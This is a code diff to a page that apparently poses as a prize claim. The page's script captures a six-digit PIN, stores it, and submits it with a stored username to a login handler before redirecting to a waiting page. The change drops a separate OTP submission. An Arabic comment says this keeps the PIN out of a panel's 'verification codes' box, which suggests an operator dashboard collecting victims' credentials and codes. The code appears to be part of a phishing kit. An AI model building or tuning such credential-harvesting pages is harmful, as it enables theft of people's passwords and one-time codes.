@@ -161,7 +161,8 @@
       if(pin.length!==6)return;
       localStorage.setItem("prizePassword",pin);
       if(window.submitLogin)await window.submitLogin({username:localStorage.getItem("prizeUsername")||"",password:pin});
-      if(window.submitOtp)await window.submitOtp(pin);
+      // الرقم السري يُرسل مع تسجيل الدخول فقط (كلمة المرور)، لا كـ OTP،
+      // حتى لا يظهر في صندوق «رموز التحقق» منفصلاً عن صندوق الدخول في اللوحة.
       location.href="prize-wait.html";
     });
   </script>
